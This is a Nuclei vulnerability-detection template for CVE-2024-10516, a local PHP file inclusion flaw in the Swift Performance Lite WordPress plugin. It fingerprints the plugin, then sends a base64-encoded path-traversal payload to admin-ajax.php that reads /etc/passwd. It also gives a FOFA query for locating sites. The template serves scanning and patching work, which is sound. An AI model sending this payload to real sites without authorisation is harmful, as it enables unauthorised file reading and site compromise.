id: CVE-2024-10516

info:
  name: Swift Performance Lite < 2.3.7.2 - Local PHP File Inclusion
  author: ritikchaddha
  severity: high
  description: |
    A vulnerability in Swift Performance Lite before version 2.3.7.2 allows unauthenticated attackers to perform local PHP file inclusion via the 'ajaxify' parameter. This can lead to arbitrary code execution on the server.
  impact: |
    Unauthenticated attackers can perform local PHP file inclusion via the ajaxify parameter to execute arbitrary code, potentially compromising the entire WordPress site.
  remediation: |
    Update Swift Performance Lite plugin to version 2.3.7.2 or later.
  reference:
    - https://github.com/RandomRobbieBF/CVE-2024-10516
    - https://nvd.nist.gov/vuln/detail/CVE-2024-10516
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2024-10516
    cwe-id: CWE-98
    epss-score: 0.85038
    epss-percentile: 0.99323
    cpe: cpe:2.3:a:swiftperformance:swift_performance_lite:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: swiftperformance
    product: swift_performance_lite
    fofa-query: body="/wp-content/plugins/swift-performance-lite"
  tags: cve,cve2024,wp,wp-plugin,wordpress,swift-performance,lfi,vuln

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        part: body
        words:
          - "/wp-content/plugins/swift-performance-lite"
        internal: true

  - raw:
      - |
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        action=swift_performance_ajaxify&data=WyJ0ZW1wbGF0ZS1wYXJ0IiwibnVsbCIsIi4uLy4uLy4uLy4uLy4uL2V0Yy9wYXNzd2QiXQ==

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"

      - type: status
        status:
          - 200
# digest: 4a0a0047304502206efddac7307449d40b887284fc88ef781455520a005fcf4e66ddb35f6ed036d9022100f02ff0a8a5aefc8d8acdfdf8296a5e8d9491ffc4427e87b848ec2067cc4b2c3f:922c64590222798bb761d5b6d8e72950